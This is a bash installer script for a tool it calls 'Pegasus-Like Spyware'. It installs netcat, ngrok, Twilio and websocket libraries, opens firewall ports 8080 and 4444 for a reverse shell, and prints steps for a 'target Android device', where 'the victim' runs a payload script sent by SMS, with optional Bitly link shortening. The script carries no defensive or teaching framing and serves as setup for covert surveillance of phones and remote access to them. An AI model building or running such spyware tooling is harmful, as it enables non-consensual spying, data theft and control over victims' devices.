#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ASCII Art
echo -e "${RED}
   ____ ___  ____ ___  ____  
  |  _ \\___ | __ )___/ ___| 
 | |_) |__ |  _ \\___ \\___ \\ 
${GREEN}
 |  __/ __|| |_) |__) |__) |
 |_|   \\___|____/____/____/
${YELLOW}
"

echo -e "${GREEN}[*] DUDE's Pegasus-Like Spyware Dependency Installer (Kali Support)${NC}"
echo -e "${YELLOW}Installing dependencies for pegasus_spyware.sh...${NC}"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[-] This script must be run as root (use sudo or run as root on Kali).${NC}"
    exit 1
fi

# Detect OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
else
    echo -e "${RED}[-] Cannot detect OS. Assuming Debian-based.${NC}"
    OS="debian"
fi

# Update package lists
echo -e "${YELLOW}[*] Updating package lists...${NC}"
if [[ "$OS" == "ubuntu" || "$OS" == "debian" || "$OS" == "kali" ]]; then
    apt update -y
elif [[ "$OS" == "centos" || "$OS" == "rhel" ]]; then
    yum update -y || dnf update -y
else
    echo -e "${RED}[-] Unsupported OS: $OS. Install manually.${NC}"
    exit 1
fi

# Install system tools
echo -e "${YELLOW}[*] Installing curl and netcat...${NC}"
if [[ "$OS" == "ubuntu" || "$OS" == "debian" || "$OS" == "kali" ]]; then
    apt install -y curl netcat-openbsd
elif [[ "$OS" == "centos" || "$OS" == "rhel" ]]; then
    yum install -y curl nc || dnf install -y curl nc
fi
if ! command -v curl >/dev/null || ! command -v nc >/dev/null; then
    echo -e "${RED}[-] Failed to install curl or netcat. Check package manager logs.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] curl and netcat installed${NC}"

# Install Python 3 and pip
echo -e "${YELLOW}[*] Installing Python 3 and pip...${NC}"
if [[ "$OS" == "ubuntu" || "$OS" == "debian" || "$OS" == "kali" ]]; then
    apt install -y python3 python3-pip
elif [[ "$OS" == "centos" || "$OS" == "rhel" ]]; then
    yum install -y python3 python3-pip || dnf install -y python3 python3-pip
fi
if ! command -v python3 >/dev/null || ! command -v pip3 >/dev/null; then
    echo -e "${RED}[-] Failed to install Python 3 or pip. Check package manager logs.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Python 3 and pip installed${NC}"

# Install Python libraries
echo -e "${YELLOW}[*] Installing Python libraries (twilio, websocket-client)...${NC}"
pip3 install twilio websocket-client --break-system-packages 2>> /tmp/pip_error.log
if ! pip3 show twilio >/dev/null || ! pip3 show websocket-client >/dev/null; then
    echo -e "${RED}[-] Failed to install twilio or websocket-client. Check /tmp/pip_error.log.${NC}"
    cat /tmp/pip_error.log
    exit 1
fi
echo -e "${GREEN}[+] Python libraries installed${NC}"

# Install ngrok
echo -e "${YELLOW}[*] Installing ngrok...${NC}"
if ! command -v ngrok >/dev/null; then
    ARCH=$(uname -m)
    if [[ "$ARCH" == "x86_64" ]]; then
        NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
    elif [[ "$ARCH" == "arm"* ]]; then
        NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
    else
        echo -e "${RED}[-] Unsupported architecture: $ARCH. Install ngrok manually from https://ngrok.com.${NC}"
        exit 1
    fi
    curl -s "$NGROK_URL" -o /tmp/ngrok.tgz 2>> /tmp/ngrok_error.log
    if [ $? -ne 0 ]; then
        echo -e "${RED}[-] Failed to download ngrok. Check /tmp/ngrok_error.log and internet connection.${NC}"
        cat /tmp/ngrok_error.log
        exit 1
    fi
    tar -xzf /tmp/ngrok.tgz -C /usr/local/bin
    rm /tmp/ngrok.tgz
fi
if ! command -v ngrok >/dev/null; then
    echo -e "${RED}[-] Failed to install ngrok. Download manually from https://ngrok.com.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] ngrok installed${NC}"

# Configure ngrok
echo -e "${YELLOW}[*] Configuring ngrok...${NC}"
read -p "${YELLOW}[?] Enter ngrok auth token (from https://dashboard.ngrok.com): ${NC}" ngrok_token
if [ -n "$ngrok_token" ]; then
    ngrok authtoken "$ngrok_token" 2>> /tmp/ngrok_error.log
    if ngrok config check >/dev/null 2>> /tmp/ngrok_error.log; then
        echo -e "${GREEN}[+] ngrok configured${NC}"
    else
        echo -e "${RED}[-] Invalid ngrok auth token. Check /tmp/ngrok_error.log and get token from https://dashboard.ngrok.com.${NC}"
        cat /tmp/ngrok_error.log
        exit 1
    fi
else
    echo -e "${RED}[-] Ngrok auth token required. Get it from https://dashboard.ngrok.com.${NC}"
    exit 1
fi

# Open firewall ports
echo -e "${YELLOW}[*] Configuring firewall...${NC}"
if command -v ufw >/dev/null; then
    ufw allow 8080
    ufw allow 4444
    echo -e "${GREEN}[+] Firewall ports 8080, 4444 opened (ufw)${NC}"
elif command -v firewall-cmd >/dev/null; then
    firewall-cmd --add-port=8080/tcp --permanent
    firewall-cmd --add-port=4444/tcp --permanent
    firewall-cmd --reload
    echo -e "${GREEN}[+] Firewall ports 8080, 4444 opened (firewalld)${NC}"
else
    echo -e "${YELLOW}[!] No supported firewall detected. Ensure ports 8080, 4444 are open manually.${NC}"
fi

# Instructions for target Android device
echo -e "${GREEN}[+] Server dependencies installed successfully${NC}"
echo -e "${YELLOW}[*] Target Android device setup instructions:${NC}"
echo -e "1. Install Termux from F-Droid (https://f-droid.org/packages/com.termux/) or GitHub."
echo -e "2. In Termux, run:"
echo -e "   pkg install termux-api websocat curl"
echo -e "   termux-setup-storage"
echo -e "3. The victim must run the payload: bash payload.sh (delivered via SMS)."
echo -e "${YELLOW}[*] Optional: Get a Bitly API key from https://bitly.com for URL shortening.${NC}"
echo -e "${YELLOW}[*] Optional: Ensure your reverse shell IP/port (e.g., 192.168.1.100:4444) is reachable.${NC}"
echo -e "${GREEN}[+] Done! Run pegasus_spyware.sh to generate and send the payload.${NC}"

